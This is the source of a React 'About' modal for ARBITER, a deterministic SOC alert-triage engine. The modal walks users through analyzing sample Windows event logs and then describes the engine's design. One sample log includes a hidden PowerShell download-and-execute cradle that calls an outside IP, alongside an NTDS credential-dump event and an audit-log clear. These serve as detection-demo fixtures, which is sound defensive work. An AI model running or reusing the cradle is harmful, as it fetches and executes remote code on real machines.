'use client'
import React, { useState, useEffect, useRef } from 'react'

const PROGRESS_KEY = 'arbiter_about_progress'
const AWAITING_KEY = 'arbiter_about_awaiting_return'

const LOG1 = `EventCode=4663
ObjectName=C:\\Windows\\NTDS\\ntds.dit
ProcessName=C:\\Windows\\System32\\ntdsutil.exe
SubjectUserName=CORP\\svc_backup
WorkstationName=CORP-DC-01
TimeCreated=2024-03-15T02:11:44.003Z

EventCode=1102
SubjectUserName=CORP\\administrator
WorkstationName=CORP-DC-01
TimeCreated=2024-03-15T03:44:12.881Z

EventCode=4698
TaskName=\\Microsoft\\Windows\\Update\\WindowsUpdateCheck
TaskContent=powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/update.ps1')"
SubjectUserName=CORP\\jdoe
WorkstationName=CORP-SRV-02
TimeCreated=2024-03-15T10:33:41.887Z`

const LOG2 = `EventCode=4624
LogonType=3
TargetUserName=CORP\\administrator
IpAddress=185.220.101.47
WorkstationName=CORP-WS-14
TimeCreated=2024-03-15T14:55:32.441Z`

const LOG3 = `EventCode=4625
LogonType=3
TargetUserName=administrator
FailureReason=%%2313
IpAddress=185.220.101.47
WorkstationName=PROD-SERVER-01
Count=47
TimeCreated=2024-03-15T16:22:07.441Z`

function loadProgress() {
  try {
    const raw = localStorage.getItem(PROGRESS_KEY)
    if (!raw) return { card: 0, complete: false }
    const p = JSON.parse(raw)
    return { card: p.current_card ?? 0, complete: p.storytelling_complete ?? false }
  } catch { return { card: 0, complete: false } }
}

function saveProgress(card, complete) {
  try {
    localStorage.setItem(PROGRESS_KEY, JSON.stringify({
      current_card: card,
      storytelling_complete: complete,
    }))
  } catch {}
}

function useTypewriter(text, active, speed = 38) {
  const [out, setOut] = useState(active ? '' : text)
  const ref = useRef(active ? 0 : text.length)
  useEffect(() => {
    if (!active) { setOut(text); ref.current = text.length; return }
    ref.current = 0
    setOut('')
    const t = setInterval(() => {
      ref.current++
      setOut(text.slice(0, ref.current))
      if (ref.current >= text.length) clearInterval(t)
    }, speed)
    return () => clearInterval(t)
  }, [text, active, speed])
  return out
}

export default function AboutModal({ onClose }) {
  const init = loadProgress()
  const [card, setCard] = useState(init.complete ? 6 : init.card)
  const [complete, setComplete] = useState(init.complete)
  const [showX, setShowX] = useState(false)
  const [scrollPct, setScrollPct] = useState(0)
  const [leaving, setLeaving] = useState(false)
  const scrollRef = useRef(null)

  const tw = useTypewriter(
    'Security tools generate alerts. Someone still has to decide what they mean, why they matter, and what to do next.',
    card === 0 && !complete
  )

  useEffect(() => {
    const el = scrollRef.current
    if (!el) return
    const onScroll = () => {
      const pct = el.scrollTop / Math.max(1, el.scrollHeight - el.clientHeight)
      setScrollPct(Math.min(100, pct * 100))
      if (pct > 0.22) setShowX(true)
    }
    el.addEventListener('scroll', onScroll, { passive: true })
    return () => el.removeEventListener('scroll', onScroll)
  }, [complete])

  function close() {
    setLeaving(true)
    setTimeout(onClose, 180)
  }

  function loadLog(log, nextCard) {
    saveProgress(nextCard, false)
    try { localStorage.setItem(AWAITING_KEY, 'true') } catch {}
    window.dispatchEvent(new CustomEvent('arbiter:load-log', { detail: { log } }))
    close()
  }

  function goComplete() {
    setComplete(true)
    setCard(6)
    saveProgress(6, true)
    if (scrollRef.current) scrollRef.current.scrollTop = 0
  }

  function goReview() {
    setComplete(false)
    setCard(0)
    saveProgress(0, false)
    if (scrollRef.current) scrollRef.current.scrollTop = 0
  }

  const mono = { fontFamily: 'var(--font-mono), monospace' }
  const amber = '#F59E0B'
  const muted = 'rgba(255,255,255,0.4)'
  const dimmed = 'rgba(255,255,255,0.25)'

  const cardDivider = (
    <div style={{ height: '0.5px', background: 'rgba(255,255,255,0.06)', margin: '0 0 56px 0' }} />
  )

  return (
    <div
      onClick={close}
      style={{
        position: 'fixed', inset: 0,
        background: 'rgba(0,0,0,0.87)',
        zIndex: 200,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        animation: leaving ? 'aboOut 0.18s ease-in forwards' : 'aboIn 0.2s ease-out',
      }}
    >
      <style>{`
        @keyframes aboIn  { from{opacity:0;transform:scale(0.97)} to{opacity:1;transform:scale(1)} }
        @keyframes aboOut { from{opacity:1;transform:scale(1)} to{opacity:0;transform:scale(0.97)} }
        @keyframes aboReveal { from{opacity:0;transform:translateY(5px)} to{opacity:1;transform:translateY(0)} }
        @keyframes aboFadeIn { from{opacity:0} to{opacity:1} }
        .abo-load-btn {
          display:block; width:100%; margin-top:16px;
          background:rgba(245,158,11,0.08);
          border:0.5px solid rgba(245,158,11,0.35);
          border-radius:4px;
          color:rgba(245,158,11,0.9);
          font-family:var(--font-mono),monospace;
          font-size:10px; letter-spacing:0.14em;
          cursor:pointer; padding:13px 16px;
          text-align:center; transition:all 0.15s;
        }
        .abo-load-btn:hover {
          background:rgba(245,158,11,0.15);
          border-color:rgba(245,158,11,0.65);
          color:#F59E0B;
        }
        .abo-continue-btn {
          background:none;
          border:0.5px solid rgba(245,158,11,0.28);
          border-radius:4px;
          color:rgba(245,158,11,0.65);
          font-family:var(--font-mono),monospace;
          font-size:9px; letter-spacing:0.12em;
          cursor:pointer; padding:11px 28px;
          transition:all 0.15s;
        }
        .abo-continue-btn:hover {
          border-color:rgba(245,158,11,0.6);
          color:#F59E0B;
        }
        .abo-review-btn {
          background:none; border:none;
          color:rgba(255,255,255,0.35);
          font-family:var(--font-mono),monospace;
          font-size:9px; letter-spacing:0.08em;
          cursor:pointer; padding:0;
          transition:color 0.15s;
        }
        .abo-review-btn:hover { color:rgba(255,255,255,0.6); }
        .abo-section-label {
          font-family:var(--font-mono),monospace;
          font-size:8px; letter-spacing:0.18em;
          color:rgba(255,255,255,0.45);
          text-transform:uppercase;
          margin-bottom:14px;
        }
        .abo-final-section { margin-bottom:36px; }
        .abo-final-section p {
          font-size:14px;
          color:var(--text-secondary);
          line-height:1.82;
          margin-bottom:12px;
        }
      `}</style>

      <div
        onClick={e => e.stopPropagation()}
        ref={scrollRef}
        style={{
          position: 'relative',
          background: 'var(--bg-card)',
          border: '0.5px solid rgba(245,158,11,0.18)',
          borderRadius: '6px',
          width: '78%', maxWidth: '860px',
          maxHeight: '88vh',
          overflowY: 'auto', overflowX: 'hidden',
          animation: 'aboReveal 0.2s ease-out',
        }}
      >

        {/* PROGRESS BAR */}
        {!complete && (
          <div style={{ position: 'sticky', top: 0, left: 0, right: 0, height: '2px', background: 'rgba(245,158,11,0.12)', zIndex: 10, flexShrink: 0 }}>
            <div style={{ height: '100%', background: amber, width: `${scrollPct}%`, transition: 'width 0.08s linear' }} />
          </div>
        )}

        {/* X BUTTON */}
        {showX && (
          <button
            onClick={close}
            style={{
              position: 'sticky', top: '10px', float: 'right',
              marginRight: '18px', marginTop: '-2px',
              background: 'none', border: 'none',
              color: 'rgba(255,255,255,0.3)',
              cursor: 'pointer', fontSize: '15px',
              zIndex: 20, transition: 'color 0.15s',
            }}
            onMouseEnter={e => e.currentTarget.style.color = 'rgba(255,255,255,0.75)'}
            onMouseLeave={e => e.currentTarget.style.color = 'rgba(255,255,255,0.3)'}
          >✕</button>
        )}

        {/* STORYTELLING */}
        {!complete && (
          <div style={{ padding: '52px 52px 0 52px' }}>

            {/* CARD 1 */}
            <div style={{ paddingBottom: '56px' }}>
              <p style={{ ...mono, fontSize: '13px', color: 'rgba(255,255,255,0.45)', lineHeight: '1.9', marginBottom: '28px', minHeight: '48px' }}>
                {tw}
                {card === 0 && tw.length < 110 && (
                  <span style={{ opacity: 0.4 }}>|</span>
                )}
              </p>
              <p style={{ fontSize: '17px', color: 'var(--text-secondary)', lineHeight: '1.75', marginBottom: '18px' }}>
                ARBITER handles that with every step of the reasoning written out, traceable and auditable.
              </p>
              <p style={{ ...mono, fontSize: '13px', color: 'rgba(245,158,11,0.75)', letterSpacing: '0.06em' }}>
                Built to be tested. Not just used.
              </p>
            </div>

            {cardDivider}

            {/* CARD 2 */}
            <div style={{ paddingBottom: '56px' }}>
              <p style={{ fontSize: '16px', color: 'var(--text-secondary)', lineHeight: '1.82', marginBottom: '22px' }}>
                When the engine produces a verdict, it shows you the exact signal that drove it, which rule fired, what weight it carried, where the evidence came from. Not a probability. Not a score from a model that learned patterns it cannot explain. A named rule with a named source.
              </p>
              <p style={{ fontSize: '14px', color: 'var(--text-muted)', lineHeight: '1.7', marginBottom: '26px' }}>
                This is the dominant signal from a real alert. Everything else in the verdict flows from here.
              </p>
              <div style={{
                ...mono,
                fontSize: '11px', lineHeight: '1.9',
                padding: '14px 18px',
                background: 'rgba(245,158,11,0.04)',
                borderRadius: '3px',
              }}>
                <div style={{ color: amber }}>
                  dominant&nbsp;&nbsp;&nbsp;&nbsp;ntds.dit accessed [NTDS_ACCESS]
                </div>
                <div style={{ color: amber, paddingLeft: '120px', marginBottom: '6px' }}>
                  weight=5 · confidence=99 · source=syslog
                </div>
                <div style={{ color: 'rgba(255,255,255,0.22)', marginBottom: '3px' }}>
                  severity&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CRITICAL across 7 signals
                </div>
                <div style={{ color: 'rgba(255,255,255,0.22)' }}>
                  classification&nbsp;&nbsp;Active Directory Credential Dump
                </div>
              </div>
            </div>

            {cardDivider}

            {/* CARD 3 */}
            <div style={{ paddingBottom: '56px' }}>
              <p style={{ fontSize: '17px', color: 'var(--text-secondary)', lineHeight: '1.75', marginBottom: '10px' }}>
                A domain controller. A backup service account. Three events in the same alert.
              </p>
              <p style={{ ...mono, fontSize: '13px', color: 'rgba(245,158,11,0.65)', marginBottom: '22px', letterSpacing: '0.04em' }}>
                Run it.
              </p>
              <div style={{
                ...mono,
                fontSize: '10px', color: 'rgba(255,255,255,0.38)',
                lineHeight: '1.85', whiteSpace: 'pre',
                background: 'rgba(245,158,11,0.03)',
                borderLeft: '2px solid rgba(245,158,11,0.25)',
                borderRadius: '0 3px 3px 0',
                padding: '13px 16px',
                overflowX: 'auto',
              }}>{LOG1}</div>
              <button className="abo-load-btn" onClick={() => loadLog(LOG1, 4)}>
                LOAD AND ANALYZE →
              </button>
            </div>

            {cardDivider}

            {/* CARD 4 */}
            <div style={{ paddingBottom: '56px' }}>
              <div style={{
                ...mono,
                fontSize: '10px', color: '#F97316',
                padding: '9px 13px',
                background: 'rgba(249,115,22,0.07)',
                borderLeft: '2px solid #F97316',
                borderRadius: '0 3px 3px 0',
                marginBottom: '22px',
                lineHeight: '1.6',
              }}>
                ⚠ CHAIN&nbsp;&nbsp;&nbsp;&nbsp;Signals span 4 attack tactics — verify full attack chain before acting
              </div>
              <p style={{ ...mono, fontSize: '12px', color: 'rgba(245,158,11,0.75)', letterSpacing: '0.06em', marginBottom: '18px' }}>
                100% confidence. TRACE_REQUIRED.
              </p>
              <p style={{ fontSize: '16px', color: 'var(--text-secondary)', lineHeight: '1.82', marginBottom: '22px' }}>
                When signals span multiple attack tactics simultaneously, the engine flags the complexity explicitly. High confidence in the detection, uncertainty about the full picture. The distinction matters.
              </p>
              <p style={{ fontSize: '15px', color: 'var(--text-secondary)', lineHeight: '1.7', marginBottom: '10px' }}>
                A confirmed malicious IP. AbuseIPDB 95/100. Tor exit node. Successful logon.
              </p>
              <p style={{ ...mono, fontSize: '13px', color: dimmed, marginBottom: '22px' }}>
                What should the engine do?
              </p>
              <div style={{
                ...mono,
                fontSize: '10px', color: 'rgba(255,255,255,0.38)',
                lineHeight: '1.85', whiteSpace: 'pre',
                background: 'rgba(245,158,11,0.03)',
                borderLeft: '2px solid rgba(245,158,11,0.25)',
                borderRadius: '0 3px 3px 0',
                padding: '13px 16px',
                overflowX: 'auto',
              }}>{LOG2}</div>
              <button className="abo-load-btn" onClick={() => loadLog(LOG2, 5)}>
                LOAD AND ANALYZE →
              </button>
            </div>

            {cardDivider}

            {/* CARD 5 */}
            <div style={{ paddingBottom: '56px' }}>
              <div style={{
                ...mono,
                fontSize: '10px', color: 'rgba(255,255,255,0.38)',
                padding: '9px 13px',
                borderLeft: '2px solid rgba(255,255,255,0.12)',
                borderRadius: '0 3px 3px 0',
                marginBottom: '22px',
                lineHeight: '1.65',
              }}>
                NO DETECTION<br />
                Threat intelligence identified a confirmed malicious IP, but ARBITER requires behavioral evidence to issue a verdict. IP reputation alone is not sufficient.
              </div>
              <p style={{ fontSize: '16px', color: 'var(--text-secondary)', lineHeight: '1.82', marginBottom: '16px' }}>
                The IP was malicious. The enrichment confirmed it. The engine still did not issue a verdict.
              </p>
              <p style={{ fontSize: '16px', color: 'var(--text-secondary)', lineHeight: '1.82', marginBottom: '22px' }}>
                IP reputation tells you something about the source. It does not tell you what happened. ARBITER requires a specific action, a specific behavioral pattern, before committing to a verdict. A system that issues verdicts on enrichment alone will eventually be wrong in ways that matter.
              </p>
              <p style={{ fontSize: '15px', color: 'var(--text-secondary)', lineHeight: '1.7', marginBottom: '10px' }}>
                Same IP. Different log. Different host.
              </p>
              <p style={{ ...mono, fontSize: '13px', color: 'rgba(245,158,11,0.65)', marginBottom: '22px', letterSpacing: '0.04em' }}>
                Run it again.
              </p>
              <div style={{
                ...mono,
                fontSize: '10px', color: 'rgba(255,255,255,0.38)',
                lineHeight: '1.85', whiteSpace: 'pre',
                background: 'rgba(245,158,11,0.03)',
                borderLeft: '2px solid rgba(245,158,11,0.25)',
                borderRadius: '0 3px 3px 0',
                padding: '13px 16px',
                overflowX: 'auto',
              }}>{LOG3}</div>
              <button className="abo-load-btn" onClick={() => loadLog(LOG3, 6)}>
                LOAD AND ANALYZE →
              </button>
            </div>

            {cardDivider}

            {/* CARD 6 */}
            <div style={{ paddingBottom: '64px' }}>
              <p style={{ ...mono, fontSize: '12px', color: dimmed, letterSpacing: '0.08em', lineHeight: '2.1', marginBottom: '22px' }}>
                Every decision visible. Every signal traced. Every limitation acknowledged.
              </p>
              <p style={{ fontSize: '16px', color: 'var(--text-secondary)', lineHeight: '1.82', marginBottom: '16px' }}>
                The MITRE panel is building a map of every technique it has seen this session. The more alerts you run, the more complete that picture becomes.
              </p>
              <p style={{ fontSize: '16px', color: 'var(--text-secondary)', lineHeight: '1.82', marginBottom: '16px' }}>
                When you are ready to act, the Containment Playbook walks you through a structured three-phase investigation, from confirming the verdict to scoping the incident. It opens when you decide to move from analysis to response.
              </p>
              <p style={{ fontSize: '16px', color: 'var(--text-secondary)', lineHeight: '1.82', marginBottom: '36px' }}>
                Try your own. Windows, Linux, CloudTrail, EDR — paste any alert and watch the engine work.
              </p>
              <button className="abo-continue-btn" onClick={goComplete}>
                CONTINUE READING →
              </button>
            </div>

          </div>
        )}

        {/* FINAL PAGE */}
        {complete && (
          <div style={{ padding: '44px 52px 52px 52px', background: 'rgba(255,255,255,0.015)', animation: 'aboFadeIn 0.3s ease-out' }}>

            <button className="abo-review-btn" onClick={goReview} style={{ marginBottom: '44px', display: 'block' }}>
              ← Review the walkthrough
            </button>

            <p style={{ fontSize: '17px', color: 'var(--text-secondary)', lineHeight: '1.85', marginBottom: '52px', maxWidth: '660px' }}>
              ARBITER is a deterministic SOC alert triage engine. It reads raw security alerts, applies explicit detection rules with traceable provenance, and produces structured verdicts. Every decision it makes is visible, auditable, and explained.
            </p>

            <div className="abo-final-section">
              <div className="abo-section-label">WHAT ARBITER IS</div>
              <p>ARBITER accepts any raw security alert — Windows Security Events, Linux Syslog, AWS CloudTrail, EDR output, or generic key-value logs. It normalizes the input through the ACS (Abstract Contextual Signal) layer, runs it through a signal detection engine with 40+ named rules, enriches source IPs against AbuseIPDB, VirusTotal, and AlienVault OTX, and produces a structured verdict with severity, classification, MITRE mapping, and recommended investigation actions.</p>
              <p>The system maintains temporal correlation across a session via Redis. When the same indicator appears in multiple alerts, it flags campaign activity automatically.</p>
            </div>

            <div className="abo-final-section">
              <div className="abo-section-label">HOW THE ENGINE DECIDES</div>
              <p>Signals are organized into four layers: behavioral (direct evidence of attack techniques), enrichment (threat intelligence from external sources), temporal (cross-session correlation via Redis), and asset (criticality of the targeted system). The dominant signal determines the verdict — behavioral signals always take priority over enrichment signals.</p>
              <p>The engine produces five distinct verdict states. SURFACE_SAFE means the dominant signal has high weight, the data quality is clean, and there is no contradiction between signal tactics — the analyst can act. TRACE_REQUIRED means the evidence is complex or contradictory — the analyst must read the decision trace before acting. ENRICHMENT_ONLY_VERDICT means the detection came from domain-specific knowledge rather than vendor-agnostic behavioral primitives. NO_DETECTION means the engine understood the input but found nothing. INSUFFICIENT_DATA means the input could not be meaningfully processed.</p>
              <p>Confidence is decomposed into components: dominant signal confidence, supporting signal contribution, temporal boost from Redis correlation, and enrichment alignment. These are displayed separately so the analyst understands what is driving the number.</p>
            </div>

            <div className="abo-final-section">
              <div className="abo-section-label">WHY DETERMINISTIC AND NOT ML</div>
              <p>In SOC environments, wrong decisions have operational consequences. A false positive stops legitimate work. A false negative lets an attacker through. Neither outcome is acceptable from a system that cannot explain why it decided what it decided.</p>
              <p>Regulatory frameworks in financial services — EU AI Act, GDPR Article 22, DORA — require that automated decisions affecting operations be auditable and explainable. The model decided is not an acceptable answer to a compliance auditor or an incident investigator.</p>
              <p>ARBITER's verdict for any alert can be traced to a specific named signal, with a specific weight, from a specific source, applying a specific rule. That chain is the output, not a byproduct.</p>
            </div>

            <div className="abo-final-section">
              <div className="abo-section-label">THE ARCHITECTURE</div>
              <p>The ACS v2 provenance model tracks the origin of every field used in detection — whether it came from a structured parse, a partial parse, or was inferred from context. The independence gate ensures that signals claiming independence actually read from different provenance sources, preventing the same raw data from being counted twice as separate evidence.</p>
              <p>Model E decomposes confidence orthogonally: behavioral confidence reflects the strength of the detection signal itself, while quality factor reflects the reliability of the data it was derived from. A high-confidence detection on low-quality data is treated differently from the same confidence on structured, verified data.</p>
              <p>The narrator layer is a bounded LLM that receives the deterministic verdict and is explicitly prohibited from overriding it. Its role is to produce the MITRE ATT&CK mapping and recommended investigation actions — not to make classification decisions.</p>
            </div>

            <div className="abo-final-section">
              <div className="abo-section-label">AUDIT AND HISTORY</div>
              <p>Your complete triage history lives in the Audit Log, accessible from the header.</p>
            </div>

            <div style={{ borderTop: '0.5px solid rgba(255,255,255,0.06)', paddingTop: '36px' }}>
              <div className="abo-section-label">BUILT BY</div>
              <div style={{ fontSize: '20px', fontWeight: '500', color: 'var(--text-primary)', marginBottom: '4px' }}>
                Luis Carlos Moreira Duarte
              </div>
              <div style={{ fontFamily: 'var(--font-mono), monospace', fontSize: '10px', color: amber, letterSpacing: '0.07em', marginBottom: '20px' }}>
                Detection Engineering · Tempest Security Intelligence
              </div>
            </div>

          </div>
        )}

      </div>
    </div>
  )
}
